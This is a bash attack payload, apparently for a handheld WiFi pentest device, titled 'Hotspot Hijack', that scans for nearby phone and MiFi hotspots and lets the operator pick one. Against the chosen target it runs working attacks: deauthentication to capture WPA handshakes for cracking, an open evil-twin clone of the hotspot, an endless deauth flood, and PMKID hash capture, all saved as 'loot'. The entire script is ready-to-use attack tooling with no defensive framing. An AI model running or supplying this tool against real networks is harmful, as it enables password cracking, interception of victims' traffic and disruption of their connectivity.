#!/bin/bash
# Title: Hotspot Hijack
# Author: bad-antics
# Description: Target mobile hotspots specifically
# Category: nullsec/attack

LOOT_DIR="/mmc/nullsec/hotspots"
mkdir -p "$LOOT_DIR"

PROMPT "HOTSPOT HIJACK

Target mobile hotspots
(phones, tablets, MiFi).

These often have weak
passwords and valuable
connected devices.

Press OK to configure."

[ ! -d "/sys/class/net/wlan0" ] && { ERROR_DIALOG "wlan0 not found!"; exit 1; }

SPINNER_START "Scanning for hotspots..."
timeout 15 airodump-ng wlan0 --write-interval 1 -w /tmp/hotscan --output-format csv 2>/dev/null
SPINNER_STOP

# Find likely hotspots (common naming patterns)
grep -iE "iPhone|Android|Galaxy|Pixel|OnePlus|Hotspot|Mobile|MiFi|Jetpack|iPhone|'s " /tmp/hotscan*.csv 2>/dev/null > /tmp/hotspots.txt

HOTSPOT_COUNT=$(wc -l < /tmp/hotspots.txt 2>/dev/null || echo 0)

if [ "$HOTSPOT_COUNT" -eq 0 ]; then
    PROMPT "NO HOTSPOTS FOUND

No mobile hotspots
detected nearby.

Try again later or
scan longer.

Press OK to exit."
    exit 0
fi

PROMPT "FOUND $HOTSPOT_COUNT HOTSPOTS

Select target by number
on next screen."

TARGET_NUM=$(NUMBER_PICKER "Target # (1-$HOTSPOT_COUNT):" 1)

TARGET_LINE=$(sed -n "${TARGET_NUM}p" /tmp/hotspots.txt)
BSSID=$(echo "$TARGET_LINE" | cut -d',' -f1 | tr -d ' ')
CHANNEL=$(echo "$TARGET_LINE" | cut -d',' -f4 | tr -d ' ')
SSID=$(echo "$TARGET_LINE" | cut -d',' -f14 | tr -d ' ')

PROMPT "TARGET SELECTED

SSID: $SSID
BSSID: $BSSID
Channel: $CHANNEL

Select attack next."

PROMPT "SELECT ATTACK:

1. Capture handshake
2. Evil twin clone
3. Deauth disruption
4. PMKID capture

Enter number next."

ATTACK=$(NUMBER_PICKER "Attack (1-4):" 1)

resp=$(CONFIRMATION_DIALOG "LAUNCH ATTACK?

Target: $SSID
Attack: $ATTACK

Press OK to begin.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

iwconfig wlan0 channel $CHANNEL
CAP_FILE="$LOOT_DIR/hotspot_${SSID}_$(date +%Y%m%d_%H%M)"

case $ATTACK in
    1) # Handshake
        LOG "Capturing handshake..."
        airodump-ng wlan0 --bssid "$BSSID" -c $CHANNEL -w "$CAP_FILE" &
        CAP_PID=$!
        sleep 3
        
        for i in 1 2 3; do
            aireplay-ng -0 5 -a "$BSSID" wlan0 2>/dev/null
            sleep 8
            if aircrack-ng "${CAP_FILE}"*.cap 2>/dev/null | grep -q "1 handshake"; then
                break
            fi
        done
        
        kill $CAP_PID 2>/dev/null
        
        if aircrack-ng "${CAP_FILE}"*.cap 2>/dev/null | grep -q "1 handshake"; then
            PROMPT "HANDSHAKE CAPTURED!

SSID: $SSID
File: ${CAP_FILE}.cap

Ready for cracking."
        else
            PROMPT "NO HANDSHAKE

Could not capture.
Try again."
        fi
        ;;
    2) # Evil twin
        LOG "Starting evil twin..."
        cat > /tmp/twin.conf << EOF
interface=wlan0
ssid=$SSID
channel=$CHANNEL
hw_mode=g
auth_algs=1
wpa=0
EOF
        hostapd /tmp/twin.conf &
        aireplay-ng -0 0 -a "$BSSID" wlan0 &
        
        PROMPT "EVIL TWIN ACTIVE

Clone of: $SSID
Press OK to stop."
        
        killall hostapd aireplay-ng 2>/dev/null
        ;;
    3) # Deauth
        LOG "Deauthing hotspot..."
        aireplay-ng -0 0 -a "$BSSID" wlan0 &
        
        PROMPT "DEAUTH ACTIVE

Target: $SSID
Press OK to stop."
        
        killall aireplay-ng 2>/dev/null
        ;;
    4) # PMKID
        LOG "Capturing PMKID..."
        timeout 30 hcxdumptool -i wlan0 -o "$CAP_FILE.pcapng" --filterlist_ap="$BSSID" --filtermode=2 2>/dev/null
        
        if [ -f "$CAP_FILE.pcapng" ]; then
            hcxpcapngtool -o "$CAP_FILE.hash" "$CAP_FILE.pcapng" 2>/dev/null
            PROMPT "PMKID captured!

File: $CAP_FILE.hash"
        else
            PROMPT "NO PMKID

Target may not support."
        fi
        ;;
esac

PROMPT "ATTACK COMPLETE

Target: $SSID
Press OK to exit."
